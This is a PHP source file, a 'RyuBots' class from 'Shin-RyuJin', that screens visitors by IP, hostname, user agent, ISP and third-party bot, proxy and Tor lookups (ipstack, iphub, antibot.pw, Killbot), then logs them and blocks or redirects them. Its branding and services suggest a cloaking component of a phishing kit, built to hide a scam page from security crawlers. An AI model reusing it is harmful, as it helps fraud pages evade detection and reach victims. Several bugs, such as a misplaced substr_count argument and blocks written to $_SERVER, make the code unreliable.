<?php
/**
 *  Shin-RyuJin
 * 
 * @author Han Ji Pyeong
 * @version 1.0 2020
 * @since 2018
 * @copyright 7Inc Store 
 * 
 */

 Class RyuBots{

    private $bots_path;
    private $bots_ext;
    private $handler;
    public function __construct()
    {
        $this->bots_path = dirname(__DIR__) . '/bots/';
        $this->bots_ext = '.jin';
        $this->handler = new RyuHandler;
    }
    public function parse_bots($files)
    {
        if(file_exists($this->bots_path . $files . $this->bots_ext))
        {
            $data = explode("\n",str_replace("\r","",file_get_contents($this->bots_path . $files . $this->bots_ext)));
        }else{
            return false;
        }
        return $data;
    }
    public function blocked_page()
    {
        echo file_get_contents(VIEW_PATH . 'html' .SEPARATOR .CONFIG['app']['blocked_page'].'.html');
        exit;
    }
    public function logbot($log,$data = [])
    {
        $fp = fopen(PUBLIC_PATH .'logs/'.$log.'.log','a');
        fwrite($fp,implode("|",$data)."\n");
        fclose($fp);
    }
    public function log($type,$data)
    {
        $handler = $this->handler->detection();
        $data = ['type' => $type,
                'blocked' => $data,
                'hostname' => $handler['hostname'],
                'useragent' => $handler['useragent'],
                'userip' => $handler['userip'],
                'platform' => $handler['platform'],
                'browser' => $handler['browser']
                ];
        return $this->logbot('block',$data);
    }
    public function bot_host()
    {
        $hostname = $this->handler->detection()['hostname'];
        
        foreach($this->parse_bots('host') as $host)
        {
            if(@preg_match("/".$host."/" , $hostname))
			{ $this->log('hostname',$host);
                $_SESSION['block'] = true;
              
			}
        }

        return ;

    }

    public function bot_agent()
    {
        $agents = $this->handler->detection()['useragent'];
        foreach($this->parse_bots('agent') as $agent)
        {
            if(strpos(strtolower($agents) , strtolower($agent)) !== false)
			{
               $this->log('useragent',$agent);
               $_SESSION['block'] = true;
			}elseif(@substr_count(strtolower($agent),strtolower($agents) > 0 ))
    		{
               $this->log('useragent',$agent);
               $_SERVER['block'] = true;
    		}
        }

        return ;

    }
    public function bot_ip()
    {
        $ips  =$this->handler->detection()['userip'];
        foreach($this->parse_bots('ip') as $ip)
		{
			if(@preg_match("/".$ip ."/", $ips))
			{
               $this->log('ip',$ip);
				$_SESSION['block'] = true;
			}
		}
    }
    public function bot_isp()
    {
        if(isset($_SESSION['api']['isp']))
		{
		foreach($this->parse_bots('isp') as $isp)
		{
			if(strpos(strtolower($_SESSION['api']['isp']), strtolower($isp)) !== false)
			{
                $this->log('isp',$isp);
                $_SESSION['block']=true;
			}
			if(substr_count(strtolower($_SESSION['api']['isp']),strtolower($isp)) > 0 )
    		{
                $this->log('isp',$isp);
                $_SESSION['block']=true;
			}

        }
        
        }
    }
    public function bot_crawlers()
    {
        $agents = $this->handler->detection()['useragent'];
        foreach($this->parse_bots('Crawlers') as $agent)
        {
            if(strpos(strtolower($agents) , strtolower($agent)) !== false)
			{
               $this->log('crawlers',$agent);
               $_SESSION['block'] = true;
			}elseif(@substr_count(strtolower($agent),strtolower($agents) > 0 ))
    		{
               $this->log('crawlers',$agent);
               $_SERVER['block'] = true;
    		}
        }
    }

    public function ipstackGet($module,$key)
	{
  		
   		$ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "http://api.ipstack.com/".$this->handler->detection()['userip']."?access_key=".$key."&".$module."=1");
        $data = curl_exec($ch);
        curl_close($ch);
        $json =json_decode($data,true);
        return $json;
	}
	public function ipstack($key)
	{
		
		$ryuu = $this->ipstackGet('security',$key);
		if(is_array(@$ryuu['security']))
		{
			$is_bot = @$ryuu['security'];
			if($is_bot['is_proxy']==true || $is_bot['is_crawler'] ==true || $is_bot['is_tor'] == true)
			{
                $this->log('ipstack',$this->handler->detection()['userip']);
                $_SESSION['block']=true;
			}
		}
		
    }
    public function antibot()
	{
  
  if($_SESSION['antibot_wasChecked'] == false || !isset($_SESSION['antibot_wasChecked'])){

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=".$this->handler->detection()['userip']."&apikey=".CONFIG['app']['antibot']."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']) );
        $data = curl_exec($ch);
        curl_close($ch);

        $_SESSION['antibot_wasChecked'] = true;

        $x = json_decode($data,true);
        if($x['is_bot']){
          
          $_SESSION['is_bot']  = true;

          $this->log('antibot',$this->handler->detection()['userip']);
          $_SESSION['block']=true;

          exit;
        }else{
          $_SESSION['is_bot']  = false;
        }

    }

    if($_SESSION['is_bot'] == true){
     $_SESSION['block']=true;
    }

    }
    public function block_proxy()
	{
		
	  	$ip =$this->handler->detection()['userip'];
	   	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_URL, "https://v2.api.iphub.info/guest/ip/$ip");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  if (curl_errno($ch))
		  {
			  echo 'Error:' . curl_error($ch);
		  }
		  curl_close($ch);
		  $json = json_decode($result, true);
		  $vpn = $json["block"];
  
		  if($vpn == 1)
		  {
             $this->log('proxy',$ip);
             $_SESSION['block']=true;
		  }
	}
    public function init($config = [])
    {

        if($config['ip'] == 1 || $config['ip'] == true)
        {
            $this->bot_ip();
        }
        if($config['agent'] == 1 || $config['agent'] == true)
        {
            $this->bot_agent();
        }
        if($config['host'] == 1 || $config['host'] == true)
        {
            $this->bot_host();
        }
        if($config['proxy'] == 1 || $config['proxy'] == true)
        {
            $this->bot_host();
        }

        if($config['killbot'] != '')
		{
			$Killbot = new Killbot([
				'active'        => true, // If 'true' will set blocker protection active, and 'false' will deactive protection
				'apikey'        => $config['killbot'], // Your API Key from https://killbot.pw/developer
				'bot_redirect'  => 'https://httpstatuses.com/' // Bot will be redirect to this URL
			]);
			$Killbot->run();

		}
		if($config['antibot'] != '')
		{
			$this->antibot();
		}

		if($config['ipstack'] != '')
		{
			$this->ipstack($config['ipstack']);
		}

    }
 }